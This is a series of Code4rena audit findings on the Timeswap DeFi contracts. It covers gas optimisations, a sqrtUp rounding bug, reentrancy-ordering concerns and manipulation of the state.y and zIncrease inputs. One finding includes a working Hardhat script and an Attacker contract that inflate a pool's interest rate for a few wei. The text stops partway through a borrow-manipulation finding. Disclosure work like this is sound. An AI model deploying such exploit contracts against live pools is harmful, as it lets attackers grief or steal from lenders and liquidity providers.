# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol the pay() function calls safeTransfer() and does so using the SafeTransfer.sol library when it can simply add the open zeppelin SafeERC20.sol import directly inside TimeswapPair.sol itself eliminating the unnecessary code in the protocols own SafeTransfer library.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L374  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/SafeTransfer.sol#L7  ## Tools Used Manual code review   ## Recommended Mitigation Steps Use the open zeppelin SafeERC20 import directly inside the TimeswapPair.sol file instead of calling your own library.  The extra safeTransfer library can then be deleted.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the pay() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserves collateral and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L369  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback "if (assetIn > 0) Callback.pay(asset, assetIn, data);"  should be placed at the end of the pay() function after all state updates have taken place.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the borrow() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to collateral, totalDebtCreated and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L322  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.borrow(collateral, dueOut.collateral, data); should be placed at the end of the borrow() function after all state updates have taken place.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the lend() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to totalClaims bonds,  insurance and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.lend(asset, xIncrease, data); should be placed at the end of the lend() function after all state updates have taken place.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the mint() function has a callback in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserve asset, collateral, and totalDebtCreated) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L177  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.mint(asset, collateral, xIncrease, dueOut.collateral, data) should be placed at the end of the mint() function after all state updates have taken place.   
# Handle  Rhynorater   # Vulnerability details  ## Impact Due to lack of constraints on user input in the `TimeswapPair.sol#mint` function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.   Disclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I'm going to give it a go.   ## Proof of Concept The attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.   Consider the following HardHat script: ``` const hre = require("hardhat");   //jtok is asset //usdc is collat  async function launchTestTokens(tokenDeployer){     //Launch a token     const TestToken = await ethers.getContractFactory("TestToken", signer=tokenDeployer);     const tt = await TestToken.deploy("JTOK", "JTOK", 1000000000000000)     const tt2 = await TestToken.deploy("USDC", "USDC", 1000000000000000)     let res = await tt.balanceOf(tokenDeployer.address)     let res2 = await tt.balanceOf(tokenDeployer.address)     console.log("JTOK balance: "+res)     console.log("USDC balance: "+res2)     return [tt, tt2] }  async function deployAttackersContract(attacker, jtok, usdc){     const Att = await ethers.getContractFactory("Attacker", signer=attacker)     const atakcontrak = await Att.deploy(jtok.address, usdc.address)     return atakcontrak }  async function deployLPContract(lp, jtok, usdc){     const LP = await ethers.getContractFactory("LP", signer=lp)     const lpc = await LP.deploy(jtok.address, usdc.address)     return lpc }  async function main() {     const [tokenDeployer, lp, attacker] = await ethers.getSigners();     let balance = await tokenDeployer.getBalance()     let factory = await ethers.getContractAt("TimeswapFactory", "0x5FbDB2315678afecb367f032d93F642f64180aa3", signer=tokenDeployer)     //let [jtok, usdc] = await launchTestTokens(tokenDeployer)     let jtok = await ethers.getContractAt("TestToken", "0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6", signer=tokenDeployer)     let usdc = await ethers.getContractAt("TestToken", "0x8a791620dd6260079bf849dc5567adc3f2fdc318", signer=tokenDeployer)     console.log("Jtok: "+jtok.address)     console.log("USDC: "+usdc.address)      //Create Pair     //let txn = await factory.createPair(jtok.address, usdc.address)     pairAddress = await factory.getPair(jtok.address, usdc.address)     pair = await ethers.getContractAt("TimeswapPair", pairAddress, signer=tokenDeployer)     console.log("Pair address: "+pairAddress);      // Deploy LP     //let lpc = await deployLPContract(lp, jtok, usdc)     let lpc = await ethers.getContractAt("LP", "0x948b3c65b89df0b4894abe91e6d02fe579834f8f", signer=lp)       let jtokb = await jtok.balanceOf(lpc.address)     let usdcb = await usdc.balanceOf(lpc.address)     console.log("LP Jtok: "+jtokb)     console.log("LP USDC: "+usdcb)      //let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)     let res = await pair.constantProduct(1641859791);     console.log("Post LP Constants:", res);      let atakcontrak = await deployAttackersContract(attacker, jtok, usdc)      jtokb = await jtok.balanceOf(atakcontrak.address)     usdcb = await usdc.balanceOf(atakcontrak.address)     console.log("Attacker Jtok: "+jtokb)     console.log("Attacker USDC: "+usdcb)      //mint some tokens     let txn2 = await atakcontrak.timeswapMint(1641859791, 15, pairAddress)      let res2 = await pair.constantProduct(1641859791);     console.log("Post Attack Constants:", res2);  } main().then(()=>process.exit(0))  ```  First, the LP deploys their pool and contributes their desired amount of tokens with the below contract: ``` pragma solidity =0.8.4;  import "hardhat/console.sol"; import {ITimeswapMintCallback} from "./interfaces/callback/ITimeswapMintCallback.sol"; import {IPair} from "./interfaces/IPair.sol"; import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; interface TestTokenLP is IERC20{     function mmint(uint256 amount) external; }  contract LP is ITimeswapMintCallback {      uint112 constant SEC_PER_YEAR = 31556926;     TestTokenLP internal jtok;     TestTokenLP internal usdc;  constructor(address _jtok, address _usdc){     jtok = TestTokenLP(_jtok);     jtok.mmint(10_000 ether);     usdc = TestTokenLP(_usdc);     usdc.mmint(10_000 ether); }  function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{     uint256 maturity = maturity;     console.log("Maturity: ", maturity);     address liquidityTo = address(this);     address dueTo = address(this);     uint112 xIncrease = 5_000 ether;     uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);     uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP     IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, ""); }   function timeswapMintCallback(         uint112 assetIn,         uint112 collateralIn,         bytes calldata data     ) override external{         jtok.mmint(100_000 ether);         usdc.mmint(100_000 ether);         console.log("Asset requested:", assetIn);         console.log("Collateral requested:", collateralIn);         //check before         uint256 beforeJtok = jtok.balanceOf(msg.sender);         console.log("LP jtok before", beforeJtok);         //transfer         jtok.transfer(msg.sender, assetIn);         //check after         uint256 afterJtok = jtok.balanceOf(msg.sender);         console.log("LP jtok after", afterJtok);         //check before         uint256 beforeUsdc = usdc.balanceOf(msg.sender);         console.log("LP USDC  before", beforeUsdc);         //transfer         usdc.transfer(msg.sender, collateralIn);         //check after         uint256 afterUsdc = usdc.balanceOf(msg.sender);         console.log("LP USDC After", afterUsdc);              } }  ``` Here are the initialization values: ```     uint112 xIncrease = 5_000 ether;     uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);     uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP ``` With this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: https://timeswap.gitbook.io/timeswap/deep-dive/borrowing to  be: ``` yMax: 4.7533146923118e-06 Min Interest Rate: 0.009374999999999765 Max Interest Rate: 0.14999999999999625 zMax: 1666.6666666666667  ``` Around 1% to 15%.   Then, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract: ``` pragma solidity =0.8.4;  import "hardhat/console.sol"; import {ITimeswapMintCallback} from "./interfaces/callback/ITimeswapMintCallback.sol"; import {IPair} from "./interfaces/IPair.sol"; import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; interface TestTokenAtt is IERC20{     function mmint(uint256 amount) external; }  contract Attacker is ITimeswapMintCallback {      uint112 constant SEC_PER_YEAR = 31556926;     TestTokenAtt internal jtok;     TestTokenAtt internal usdc;  constructor(address _jtok, address _usdc){     jtok = TestTokenAtt(_jtok);     jtok.mmint(10_000 ether);     usdc = TestTokenAtt(_usdc);     usdc.mmint(10_000 ether); }  function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{     uint256 maturity = maturity;     console.log("Maturity: ", maturity);     address liquidityTo = address(this);     address dueTo = address(this);     uint112 xIncrease = 3;     uint112 yIncrease = 1000000000000000;     uint112 zIncrease = 5; //Static 167% CDP     IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, ""); }   function timeswapMintCallback(         uint112 assetIn,         uint112 collateralIn,         bytes calldata data     ) override external{         jtok.mmint(100_000 ether);         usdc.mmint(100_000 ether);         console.log("Asset requested:", assetIn);         console.log("Collateral requested:", collateralIn);         //check before         uint256 beforeJtok = jtok.balanceOf(msg.sender);         console.log("Attacker jtok before", beforeJtok);         //transfer         jtok.transfer(msg.sender, assetIn);         //check after         uint256 afterJtok = jtok.balanceOf(msg.sender);         console.log("Attacker jtok after", afterJtok);         //check before         uint256 beforeUsdc = usdc.balanceOf(msg.sender);         console.log("Attacker USDC  before", beforeUsdc);         //transfer         usdc.transfer(msg.sender, collateralIn);         //check after         uint256 afterUsdc = usdc.balanceOf(msg.sender);         console.log("Attacker USDC After", afterUsdc);              } } ```  Which contains the following settings for a mint: ```     uint112 xIncrease = 3;     uint112 yIncrease = 1000000000000000;     uint112 zIncrease = 5; //Static 167% CDP ```  According to my logs in hardhat: ```     Maturity:  1641859791     Callback before: 8333825816710789998373     Asset requested: 3     Collateral requested: 6     Attacker jtok before 5000000000000000000000     Attacker jtok after 5000000000000000000003     Attacker USDC  before 8333825816710789998373     Attacker USDC After 8333825816710789998379     Callback after: 8333825816710789998379     Callback expected after: 8333825816710789998379  ``` The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes: ``` yMax: 0.0002047533146923118 Min Interest Rate: 0.40383657499999975 Max Interest Rate: 6.461385199999996 zMax: 1666.6666666666667 ``` Between 40 and 646 percent.   xyz values before and after: ``` Post LP Constants: [ BigNumber { value: "5000000000000000000000" },   BigNumber { value: "23766573461559" },   BigNumber { value: "8333333333333333333333" },   x: BigNumber { value: "5000000000000000000000" },   y: BigNumber { value: "23766573461559" },   z: BigNumber { value: "8333333333333333333333" } ] Attacker Jtok: 10000000000000000000000 Attacker USDC: 10000000000000000000000 Post Attack Constants: [ BigNumber { value: "5000000000000000000003" },   BigNumber { value: "1023766573461559" },   BigNumber { value: "8333333333333333333338" },   x: BigNumber { value: "5000000000000000000003" },   y: BigNumber { value: "1023766573461559" },   z: BigNumber { value: "8333333333333333333338" } ]  ```  This result in destruction of the pool.   
# Handle  Rhynorater   # Vulnerability details  In `BurnMath.sol` we have the following function defined; ```     function getAsset(IPair.State memory state, uint256 liquidityIn) internal pure returns (uint128 assetOut) {         if (state.reserves.asset <= state.totalClaims.bond) return assetOut;          uint256 _assetOut = state.reserves.asset;         _assetOut -= state.totalClaims.bond;         _assetOut = _assetOut.mulDiv(liquidityIn, state.totalLiquidity);         assetOut = _assetOut.toUint128(); } ``` Since the above `if` statement ensures that `state.reserves.asset` is  not less than or equal to `state.totalClaims.bond`, it is impossible for the `_assetOut -= state.totalClaims.bond; ` line to underflow. As a result, adding the `unchecked` directive around this will save on gas.  By the same reasoning, in the `getCollateral` function: ``` deficit -= state.reserves.asset; ``` is already checked by the  ``` if (state.reserves.asset >= state.totalClaims.bond) { ``` `if` statement. Surrounding this with `unchecked` will also save on gas.  Lastly, this also applies in `WithdrawMath.sol#getCollateral`: ```         if (state.reserves.asset >= state.totalClaims.bond) return collateralOut;         uint256 deficit = state.totalClaims.bond;         deficit -= state.reserves.asset; ``` The deficit will never underflow here, so adding `unchecked` will save on gas.   ##References https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/BurnMath.sol#L22 https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/BurnMath.sol#L41 https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L33   
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L132-L132  ```solidity if (significantDigits > 10 ** 9) { ```  Can be changed to:  ```solidity if (significantDigits > 1e9) { ```  
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol#L19-L22  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (z % y > 0) z++; } ```  For example, when `y = 9`: -   At L20, z = sqrt(9) = 3 -   At L21, z % y = 3 % 9 = 3, so that `z % y > 0` is true, therefore, `z++`, z is 4   Expected Results: sqrtUp(9) = 4  Actual Results: sqrtUp(9) = 3  ### Recommendation  Change to:  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (z * z < y) ++z; } ``` or  ```solidity function sqrtUp(uint256 y) internal pure returns (uint256 z) {     z = sqrt(y);     if (y % z != 0) ++z; } ```  
# Handle  WatchPug   # Vulnerability details  The check of `y > 3` is unnecessary and most certainly adds more gas cost than it saves as the majority of use cases of this function will not be handling `y <= 3`.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol#L6-L17  ```solidity function sqrt(uint256 y) internal pure returns (uint256 z) {     if (y > 3) {         z = y;         uint256 x = y / 2 + 1;         while (x < z) {             z = x;             x = (y / x + x) / 2;         }     } else if (y != 0) {         z = 1;     } } ```  ### Recommendation  Change to:  ```solidity function sqrt(uint x) public pure returns (uint y) {     uint z = (x + 1) / 2;     y = x;     while (z < y) {         y = z;         z = (x / z + z) / 2;     } } ```  Or use:  https://github.com/Rari-Capital/solmate/blob/dd13c61b5f9cb5c539a7e356ba94a6c2979e9eb9/src/utils/FixedPointMathLib.sol#L150-L205   
# Handle  WatchPug   # Vulnerability details  Check input value earlier can avoid unnecessary code execution when this check failed.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/SafeCast.sol#L13-L15  ```solidity function toUint128(uint256 x) internal pure returns (uint128 y) {     require((y = uint128(x)) == x); } ```  See: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4961a51cc736c7d4aa9bd2e11e4cbbaff73efee9/contracts/utils/math/SafeCast.sol#L48  ### Recommendation  Change to:  ```solidity function toUint128(uint256 value) internal pure returns (uint128) {     require(value <= type(uint128).max, "SafeCast: value doesn't fit in 128 bits");     return uint128(value); } ```  `SafeCast.sol#toUint112()` got the similar issue.  
# Handle  0x0x0x   # Vulnerability details  ## Impact  `!= 0` is a cheaper operation compared to `> 0`, when dealing with `uint`.  ## Occurrences  ```  ./Timeswap-V1-Convenience/contracts/base/ERC721.sol:147:            } else if (_return.length > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Burn.sol:40:        if (tokensOut.asset > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Burn.sol:65:        if (tokensOut.collateral > 0) { ./Timeswap-V1-Convenience/contracts/libraries/DateTime.sol:128:        if (year >= 1970 && month > 0 && month <= 12) { ./Timeswap-V1-Convenience/contracts/libraries/DateTime.sol:130:            if (day > 0 && day <= daysInMonth) { ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:296:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:455:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Mint.sol:614:        require(pair.totalLiquidity(params.maturity) > 0, 'E507'); ./Timeswap-V1-Convenience/contracts/libraries/Pay.sol:86:        if (collateralOut > 0) { ./Timeswap-V1-Convenience/contracts/libraries/PayMath.sol:27:                if (due.debt > 0) { ./Timeswap-V1-Convenience/contracts/libraries/SquareRoot.sol:21:        if (z % y > 0) z++; ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:40:        if (tokensOut.asset > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:58:        if (tokensOut.collateral > 0) { ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:75:        if (params.claimsIn.bond > 0) ./Timeswap-V1-Convenience/contracts/libraries/Withdraw.sol:77:        if (params.claimsIn.insurance > 0) ./Timeswap-V1-Core/contracts/TimeswapPair.sol:153:        require(xIncrease > 0 && yIncrease > 0 && zIncrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:170:        require(liquidityOut > 0, 'E212'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:203:        require(liquidityIn > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:217:        if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:218:        if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:236:        require(xIncrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:239:        require(pool.state.totalLiquidity > 0, 'E206'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:274:        require(claimsIn.bond > 0 || claimsIn.insurance > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:292:        if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:293:        if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:311:        require(xDecrease > 0, 'E205'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:314:        require(pool.state.totalLiquidity > 0, 'E206'); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:369:        if (assetIn > 0) Callback.pay(asset, assetIn, data); ./Timeswap-V1-Core/contracts/TimeswapPair.sol:374:        if (collateralOut > 0) collateral.safeTransfer(to, collateralOut); ./Timeswap-V1-Core/contracts/libraries/FullMath.sol:34:                require(denominator > 0); ./Timeswap-V1-Core/contracts/libraries/FullMath.sol:124:        if (mulmod(a, b, denominator) > 0) result++; ./Timeswap-V1-Core/contracts/libraries/Math.sol:7:        if (x % y > 0) z++;  ```  
# Handle  WatchPug   # Vulnerability details  Every reason string takes at least 32 bytes.  Use short reason strings that fits in 32 bytes or it will become more expensive.  Instances include:  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/base/ERC721.sol#L55-L58  ```solidity require(     owner == msg.sender || isApprovedForAll[owner][msg.sender],     'ERC721 :: approve : Approve caller is not owner nor approved for all' ); ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/base/ERC721.sol#L96-L99  ```solidity require(     _checkOnERC721Received(address(0), to, id, ''),     'ERC721 :: _safeMint : Transfer to non ERC721Receiver implementer' ); ```  
# Handle  WatchPug   # Vulnerability details  There is no risk of overflow caused by increamenting the iteration index in for loops (the `i++` in for `for (uint256 i; i < ids.length; i++)`).  Increments perform overflow checks that are not necessary in this case.  ### Recommendation  Surround the increment expressions with an `unchecked { ... }` block to avoid the default overflow checks. For example, change the for loop:   https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/PayMath.sol#L21-L33  ```solidity for (uint256 i; i < ids.length; i++) {     IPair.Due memory due = pair.dueOf(maturity, address(collateralizedDebt), ids[i]);      if (assetsIn[i] > due.debt) assetsIn[i] = due.debt;     if (msg.sender == collateralizedDebt.ownerOf(ids[i])) {         uint256 _collateralOut = due.collateral;         if (due.debt > 0) {             _collateralOut *= assetsIn[i];             _collateralOut /= due.debt;         }         collateralsOut[i] = _collateralOut.toUint112();     } } ```  to:  ```solidity for (uint256 i; i < ids.length;) {     IPair.Due memory due = pair.dueOf(maturity, address(collateralizedDebt), ids[i]);      if (assetsIn[i] > due.debt) assetsIn[i] = due.debt;     if (msg.sender == collateralizedDebt.ownerOf(ids[i])) {         uint256 _collateralOut = due.collateral;         if (due.debt > 0) {             _collateralOut *= assetsIn[i];             _collateralOut /= due.debt;         }         collateralsOut[i] = _collateralOut.toUint112();     }      unchecked { ++i; } } ```   
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/BorrowMath.sol#L19-L53  This issue is similar to the two previous issues related to `state.y` manipulation. Unlike the other two issues, this function is not on `TimeswapPair.sol` but on `TimeswapConvenience.sol`, therefore this can not be solved by adding `onlyConvenience` modifier.  Actually, we believe that it does not make sense for the caller to specify the interest they want to pay, we recommend removing this function.  ## Impact  - When `pool.state.y` is extremely large, many core features of the protocol will malfunction, as the arithmetic related to `state.y` can overflow. For example:  LendMath.check(): https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/LendMath.sol#L28-L28  BorrowMath.check(): https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L31-L31  - An attacker can set `state.y` to a near overflow value, then `lend()` to get a large amount of extra interest (as Bond tokens) with a small amount of asset tokens. This way, the attacker can steal funds from other lenders and liquidity providers.   
# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/MintMath.sol#L14-L34  The current implementation of `TimeswapPair.sol#mint()` allows the caller to specify an arbitrary value for `yIncrease`.  However, since `state.y` is expected to be a large number based at `2**32`, once the initial `state.y` is set to a small number (1 wei for example), the algorithm won't effectively change `state.y` with regular market operations (`borrow`, `lend` and `mint`).  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L17-L37  The pair with the maturity will malfunction and can only be abandoned.  A malicious user/attacker can use this to frontrun other users or the platform's `newLiquidity()` call to initiate a griefing attack.  If the desired `maturity` is a meaningful value for the user/platform, eg, end of year/quarter. This can be a noteworthy issue.  ## Recommendation  Consider adding validation of minimal `state.y` for new liquidity.  Can be `2**32 / 10000` for example.  
# Handle  WatchPug   # Vulnerability details  `checkProportional()` is a rather simple one line function, making it inline instead of an internal function call can make the code simpler and save some gas.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359-L368  ```solidity for (uint256 i; i < ids.length; i++) {     Due storage due = dues[ids[i]];     require(due.startBlock != BlockNumber.get(), 'E207');     if (owner != msg.sender) require(collateralsOut[i] == 0, 'E213');     PayMath.checkProportional(assetsIn[i], collateralsOut[i], due);     due.debt -= assetsIn[i];     due.collateral -= collateralsOut[i];     assetIn += assetsIn[i];     collateralOut += collateralsOut[i]; } ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/PayMath.sol#L7-L14  ```solidity function checkProportional(     uint112 assetIn,     uint112 collateralOut,     IPair.Due memory due ) internal pure {     require(uint256(assetIn) * due.collateral >= uint256(collateralOut) * due.debt, 'E303'); } } ```  Can be changed to:  ```solidity for (uint256 i; i < ids.length; i++) {     Due storage due = dues[ids[i]];     require(due.startBlock != BlockNumber.get(), 'E207');     if (owner != msg.sender) require(collateralsOut[i] == 0, 'E213');     require(uint256(assetIn[i]) * due.collateral >= uint256(collateralOut[i]) * due.debt, 'E303');     due.debt -= assetsIn[i];     due.collateral -= collateralsOut[i];     assetIn += assetsIn[i];     collateralOut += collateralsOut[i]; } ```   
# Handle  WatchPug   # Vulnerability details  In the current implementation, `borrow()` takes a user input value of `zIncrease`, while the actual collateral asset transferred in is calculated at L319, the state of `pool.state.z` still increased by the value of the user's input at L332.  Even though a large number of `zIncrease` means that the user needs to add more collateral, the attacker can use a dust amount `xDecrease` (1 wei for example) so that the total collateral needed is rather small.  Plus, the attacker can always `pay()` the dust amount of loan to get back the rather large amount of collateral added.  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L299-L338  ```solidity function borrow(     uint256 maturity,     address assetTo,     address dueTo,     uint112 xDecrease,     uint112 yIncrease,     uint112 zIncrease,     bytes calldata data ) external override lock returns (uint256 id, Due memory dueOut) {     require(block.timestamp < maturity, 'E202');     require(assetTo != address(0) && dueTo != address(0), 'E201');     require(assetTo != address(this) && dueTo != address(this), 'E204');     require(xDecrease > 0, 'E205');      Pool storage pool = pools[maturity];     require(pool.state.totalLiquidity > 0, 'E206');      BorrowMath.check(pool.state, xDecrease, yIncrease, zIncrease, fee);      dueOut.debt = BorrowMath.getDebt(maturity, xDecrease, yIncrease);     dueOut.collateral = BorrowMath.getCollateral(maturity, pool.state, xDecrease, zIncrease);     dueOut.startBlock = BlockNumber.get();      Callback.borrow(collateral, dueOut.collateral, data);      id = pool.dues[dueTo].insert(dueOut);      pool.state.reserves.asset -= xDecrease;     pool.state.reserves.collateral += dueOut.collateral;     pool.state.totalDebtCreated += dueOut.debt;      pool.state.x -= xDecrease;     pool.state.y += yIncrease;     pool.state.z += zIncrease;      asset.safeTransfer(assetTo, xDecrease);      emit Sync(maturity, pool.state.x, pool.state.y, pool.state.z);     emit Borrow(maturity, msg.sender, assetTo, dueTo, xDecrease, id, dueOut); } ```  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/libraries/BorrowMath.sol#L62-L79  ```solidity function getCollateral(     uint256 maturity,     IPair.State memory state,     uint112 xDecrease,     uint112 zIncrease ) internal view returns (uint112 collateralIn) {     uint256 _collateralIn = maturity;     _collateralIn -= block.timestamp;     _collateralIn *= zIncrease;     _collateralIn = _collateralIn.shiftRightUp(25);     uint256 minimum = state.z;     minimum *= xDecrease;     uint256 denominator = state.x;     denominator -= xDecrease;     minimum = minimum.divUp(denominator);     _collateralIn += minimum;     collateralIn = _collateralIn.toUint112(); } ```  ## PoC  Near the maturity time, 